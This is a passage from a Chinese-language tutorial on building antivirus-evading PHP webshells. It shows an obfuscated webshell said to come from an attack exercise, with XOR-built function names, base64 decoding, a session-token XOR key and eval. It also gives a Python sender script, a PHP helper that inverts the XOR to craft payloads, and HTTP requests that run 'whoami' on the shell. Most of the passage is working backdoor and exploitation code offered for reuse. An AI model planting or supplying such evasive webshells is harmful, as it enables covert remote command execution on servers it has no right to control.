</span>hex_code <span class="token operator">=</span> php_code<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 在字符串的开头和结尾加上num个任意字符
</span>encoded_code <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span>num <span class="token operator">+</span> hex_code <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span>num

<span class="token comment" spellcheck="true"># 发送POST请求
</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'<a class="token url-link" href="http://your-target-url/path-to-php-file.php">http://your-target-url/path-to-php-file.php</a>'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">'num'</span><span class="token punctuation">:</span> num<span class="token punctuation">,</span>
    <span class="token string">'Qxi*37yz'</span><span class="token punctuation">:</span> encoded_code<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 打印服务器的响应
</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>


<p><img alt="样例二成功执行命令.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729086000-15tmsdt.png-w331s"></p>
<h3 id="123">12.3 样例三</h3>
<p>这个免杀马是在近期某大型攻防演练中捕获到的，也是能过一众查杀引擎~
这个样例使用了异或+编解码转换+参数加解密回调+密钥协商的手法，成功规避了语义分析和正则匹配式，具有实战意义</p>
<p>这个WebShell和冰蝎马等具有相似性，各位师傅不妨可以看看原理：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">set_token<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$r</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">&lt;</span><span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$r</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token operator">%</span><span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$r</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token operator">%</span><span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"HTTP_TOKEN"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$t</span><span class="token operator">=</span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token function">md5<span class="token punctuation">(</span></span><span class="token function">rand<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>
    <span class="token function">header<span class="token punctuation">(</span></span><span class="token string">'Token:'</span><span class="token punctuation">.</span><span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$v</span><span class="token operator">=</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CSRF_TOKEN'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span><span class="token operator">=</span><span class="token string">'DQHNGW'</span><span class="token operator">^</span><span class="token string">'&amp;0;+qc'</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'_dec'</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'de'</span><span class="token punctuation">;</span>
    <span class="token variable">$v</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name">E</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct<span class="token punctuation">(</span></span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'ZSLQWR'</span><span class="token operator">^</span><span class="token string">'82?4af'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"_d"</span><span class="token punctuation">.</span><span class="token string">"eco"</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">108</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"e"</span><span class="token punctuation">;</span>
            <span class="token variable">$e</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">eval<span class="token punctuation">(</span></span><span class="token keyword">null</span><span class="token punctuation">.</span><span class="token variable">$e</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    @<span class="token keyword">new</span> <span class="token class-name">E</span><span class="token punctuation">(</span><span class="token function">set_token<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>


<p>这个WebShell要如何执行命令呢？共需要三步，请看我细细分析~</p>
<p>首先，这个函数定义了一个函数 <code>set_token()</code> 和一个类 <code>class E</code>，但我们不着急看，我们先看PHP先执行的部分：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"HTTP_TOKEN"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$t</span><span class="token operator">=</span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token function">md5<span class="token punctuation">(</span></span><span class="token function">rand<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>
    <span class="token function">header<span class="token punctuation">(</span></span><span class="token string">'Token:'</span><span class="token punctuation">.</span><span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$v</span><span class="token operator">=</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CSRF_TOKEN'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span><span class="token operator">=</span><span class="token string">'DQHNGW'</span><span class="token operator">^</span><span class="token string">'&amp;0;+qc'</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'_dec'</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'de'</span><span class="token punctuation">;</span>
    <span class="token variable">$v</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>


<p>由1.6讲到的知识点，结合PHP代码可得：</p>
<blockquote>
<p>if (!isset(<script type="math/tex">_SESSION['token'])) 这行代码首先检查当前会话（session）中是否存在名为 "token" 的变量。
</script>_SESSION 是用于在PHP中存储会话数据的关联数组，通常用于在不同页面之间共享数据。isset函数用于检查变量是否已经被设置，如果变量存在并且有值，返回 true，否则返回 false。</p>
</blockquote>
<p>所以根据知识点，我们要先给服务器发一个 <code>Token</code> 值，这样就可以进入IF，服务器就会生成一个随机的令牌（token）并将其存储在会话（session）中，并通过HTTP头部返回给客户端</p>
<p>但 <code>Token</code> 只需要获取一次就行了，因为服务器生成并返还令牌（token）后，会存在会话（session）中，简单理解就是服务器的内存当中，后续的使用就不要添加<code>Token</code> 值了
<strong>【因为如果再获取，令牌（token）又会重新生成，就无法进入else的后续步骤，这一步可能有点绕，不明白的师傅不妨上手实践一下哈哈】</strong></p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$v</span><span class="token operator">=</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CSRF_TOKEN'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token string">'DQHNGW'</span><span class="token operator">^</span><span class="token string">'&amp;0;+qc'</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'_dec'</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'de'</span><span class="token punctuation">;</span>
<span class="token variable">$v</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>由8.1讲到的异或和0.1讲到的拼接赋值，以上代码可转化为：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CSRF_TOKEN'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">"base64_decode"</span><span class="token punctuation">;</span>
<span class="token variable">$v</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>意思就是，从HTTP请求头获取名为 "HTTP_X_CSRF_TOKEN" 的值，并进行Base64解密再讲值重新赋给 <code>$v</code></p>
<p>接下来我们再来看类 <code>class E</code> :</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">class</span> <span class="token class-name">E</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct<span class="token punctuation">(</span></span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'ZSLQWR'</span><span class="token operator">^</span><span class="token string">'82?4af'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"_d"</span><span class="token punctuation">.</span><span class="token string">"eco"</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">108</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"e"</span><span class="token punctuation">;</span>
            <span class="token variable">$e</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">eval<span class="token punctuation">(</span></span><span class="token keyword">null</span><span class="token punctuation">.</span><span class="token variable">$e</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre>


<p>同样根据相关知识点，我们可以将以上代码转化为以下：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">class</span> <span class="token class-name">E</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct<span class="token punctuation">(</span></span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string">"base64_decode"</span><span class="token punctuation">;</span>
            <span class="token variable">$e</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">eval<span class="token punctuation">(</span></span><span class="token keyword">null</span><span class="token punctuation">.</span><span class="token variable">$e</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre>


<p>意思就是类 <code>class E</code> 接受一个参数 <code>$p</code>，将其通过Base64解密后，放入高危函数 <code>eval</code> 内执行
<strong>那我们想要成功执行命令，就必须控制 $p 的传入值</strong></p>
<p>那我们看看所谓的 <code>$p</code> 是从哪里传入的吧：</p>
<pre class="codehilite language-php"><code class=" language-php">@<span class="token keyword">new</span> <span class="token class-name">E</span><span class="token punctuation">(</span><span class="token function">set_token<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>由此可知，<code>$p</code> 为 <code>set_token($v, $_SESSION['token'])</code> 的执行结果，所以我们要控制 <code>set_token($v, $_SESSION['token'])</code> 的内容才能成功执行命令</p>
<ul>
<li><code>$v</code> 参数：从HTTP请求头获取名为 "HTTP_X_CSRF_TOKEN" 的值，并进行Base64解密再讲值重新赋给 <code>$v</code></li>
<li><code>$_SESSION['token']</code> 参数：给服务器发一个 <code>TOKEN</code> 值，会生成一个随机的令牌（token）并将其存储在会话（session）中，并通过HTTP头部返回给客户端</li>
</ul>
<p>明白了两个参数都是从哪来的之后，我们再来看函数 <code>set_token()</code>：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">set_token<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$r</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">&lt;</span><span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$r</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token operator">%</span><span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$r</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token operator">%</span><span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>


<p>简单来说，函数 <code>set_token($v, $t)</code> 就是一个加密算法，作用是根据输入的两个字符串 <code>$v</code> 和 <code>$t</code>，返回一个新的字符串 <code>$r</code>
该函数采用异或（XOR）操作对两个字符串的每个字符进行逐一处理，并将结果拼接成新的字符串返回</p>
<p>而返回的 <code>$r</code> 变量，最终会传入 <code>@new E($r)</code>，进行Base64解密并放入高危函数 <code>eval</code> 内执行</p>
<p>打个比方，假设我们想执行系统命令 <code>whoami</code>，那 <code>$r</code> 变量就应该是 <code>system('whoami');</code> Base64加密后的字符串 <code>c3lzdGVtKCd3aG9hbWknKTsg</code>
而 <code>$r</code> 变量又是 <code>set_token($v, $_SESSION['token'])</code> 的加密结果，看上去很清晰，那目前我们的困境是什么？</p>
<p>那就是我们不知道 <code>$v</code> 应该传什么值！！！我们目前只知道 <code>$t=&gt;$_SESSION['token']</code> 和执行的最终结果 <code>$r=&gt;c3lzdGVtKCd3aG9hbWknKTsg</code>，那我们能不能通过这两个变量获得 <code>$v</code>呢，当然可以！！！</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">decrypt_token<span class="token punctuation">(</span></span><span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token operator">!</span><span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$v</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr<span class="token punctuation">(</span></span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">%</span> <span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$v</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr<span class="token punctuation">(</span></span><span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord<span class="token punctuation">(</span></span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">%</span> <span class="token function">strlen<span class="token punctuation">(</span></span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$v</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">
// 已知的 $t 和 $r 的值
</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"> //已知的 $t 的值
</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'out'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"> //"c3lzdGVtKCd3aG9hbWknKTsg" 已知的 $r 的值
</span><span class="token comment" spellcheck="true">
// 解密已知的 $r 值得到 $v
</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">decrypt_token<span class="token punctuation">(</span></span><span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>通过编写这么一段代码，调换了一下顺序，就可以通过 <code>$t=&gt;$_SESSION['token']</code> 和 <code>$r=&gt;c3lzdGVtKCd3aG9hbWknKTsg</code>，拿到参数 <code>$v</code></p>
<p>至此，整条利用链已经清晰，我们来复现一下吧：</p>
<h4 id="1231-token">12.3.1 第一步、密钥协商得到Token</h4>
<p>对WebShell进行发包，<code>Token</code> 随便填啥都行</p>
<pre class="codehilite language-http"><code class=" language-http">GET /muma.php HTTP/1.1
<span class="token keyword">Host:</span> test.ctf.com
<span class="token keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
<span class="token keyword">Token:</span> 1
<span class="token keyword">Content-Length:</span> 0</code></pre>


<p>在返回包中可以看到服务器生成的 <code>Token</code> 值和 <code>Cookie</code> 值</p>
<p><img alt="样例三-1.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729086000-16fkfal.png-w331s"></p>
<h4 id="1232-x-csrf-token">12.3.2 第二步，得到X-CSRF-TOKEN</h4>
<p>假设我们想执行系统命令 <code>whoami</code>，PHP代码就是 <code>system('whoami');</code>，对其进行Base64加密后的字符串 <code>c3lzdGVtKCd3aG9hbWknKTsg</code>，当然你想执行其他的命令也行哈哈</p>
<pre class="codehilite language-http"><code class=" language-http">POST /decode.php HTTP/1.1
<span class="token keyword">Host:</span> test.ctf.com
<span class="token keyword">Content-Type:</span> application/x-www-form-urlencoded
<span class="token keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
<span class="token keyword">Content-Length:</span> 0

token=a2b3fca92539495e&amp;out=c3lzdGVtKCd3aG9hbWknKTsg</code></pre>


